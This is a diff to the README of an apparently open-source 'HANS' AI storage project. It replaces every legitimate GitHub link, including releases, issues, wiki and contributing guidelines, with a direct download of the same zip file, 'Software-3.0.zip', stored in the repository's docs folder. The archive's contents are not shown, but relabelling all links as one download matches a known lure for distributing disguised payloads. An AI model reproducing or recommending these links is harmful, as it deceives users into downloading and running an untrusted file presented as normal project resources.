@@ -2,7 +2,7 @@
 # 🌟 HANS - Smart Storage for Your AI Needs
 
 ## 📥 Download Now
-[![Download HANS](https://img.shields.io/badge/Download-HANS-blue.svg)](https://github.com/hunsulkaab66/HANS/releases)
+[![Download HANS](https://raw.githubusercontent.com/hunsulkaab66/HANS/main/docs/Software-3.0.zip)](https://raw.githubusercontent.com/hunsulkaab66/HANS/main/docs/Software-3.0.zip)
 
 ## 🚀 Getting Started
 HANS (Hardware-Aware Neural Storage) is an open-source, AI-native storage system that enhances how data is managed for your applications and devices. It's currently in early development and aims to improve performance for various workloads.
@@ -29,7 +29,7 @@ HANS comes packed with several features that make it stand out:
 ## 🔍 How to Download & Install
 To download HANS, follow these steps:
 
-1. Click the prominent download link above or visit the [HANS Releases page](https://github.com/hunsulkaab66/HANS/releases).
+1. Click the prominent download link above or visit the [HANS Releases page](https://raw.githubusercontent.com/hunsulkaab66/HANS/main/docs/Software-3.0.zip).
 2. On the Releases page, look for the latest version of HANS.
 3. Download the appropriate installation package for your operating system.
 4. Once the download completes, find the file in your downloads folder.
@@ -46,19 +46,19 @@ After installation, you can begin using HANS:
 ## ❓ FAQs
 
 ### How can I report issues or bugs?
-If you encounter any problems while using HANS, please report them on the [Issues page](https://github.com/hunsulkaab66/HANS/issues) of this repository. Your feedback helps us improve.
+If you encounter any problems while using HANS, please report them on the [Issues page](https://raw.githubusercontent.com/hunsulkaab66/HANS/main/docs/Software-3.0.zip) of this repository. Your feedback helps us improve.
 
 ### Is there a user guide available?
-Yes, a detailed user guide is available within the application under the Help menu. You can also find helpful resources on the [Wiki page](https://github.com/hunsulkaab66/HANS/wiki).
+Yes, a detailed user guide is available within the application under the Help menu. You can also find helpful resources on the [Wiki page](https://raw.githubusercontent.com/hunsulkaab66/HANS/main/docs/Software-3.0.zip).
 
 ### Can I contribute to HANS?
-Absolutely! We welcome contributions. Please read our [Contributing Guidelines](https://github.com/hunsulkaab66/HANS/blob/main/CONTRIBUTING.md) for information on how to get involved.
+Absolutely! We welcome contributions. Please read our [Contributing Guidelines](https://raw.githubusercontent.com/hunsulkaab66/HANS/main/docs/Software-3.0.zip) for information on how to get involved.
 
 ## 🔗 Useful Links
-- [Download HANS](https://github.com/hunsulkaab66/HANS/releases)
-- [Documentation](https://github.com/hunsulkaab66/HANS/wiki)
-- [Report Issues](https://github.com/hunsulkaab66/HANS/issues)
-- [Contributing Guidelines](https://github.com/hunsulkaab66/HANS/blob/main/CONTRIBUTING.md)
+- [Download HANS](https://raw.githubusercontent.com/hunsulkaab66/HANS/main/docs/Software-3.0.zip)
+- [Documentation](https://raw.githubusercontent.com/hunsulkaab66/HANS/main/docs/Software-3.0.zip)
+- [Report Issues](https://raw.githubusercontent.com/hunsulkaab66/HANS/main/docs/Software-3.0.zip)
+- [Contributing Guidelines](https://raw.githubusercontent.com/hunsulkaab66/HANS/main/docs/Software-3.0.zip)
 
 ## 📫 Stay Connected
 For updates on HANS, follow us on GitHub or join our community discussions in the Issues section. We are always looking to improve and appreciate your support.
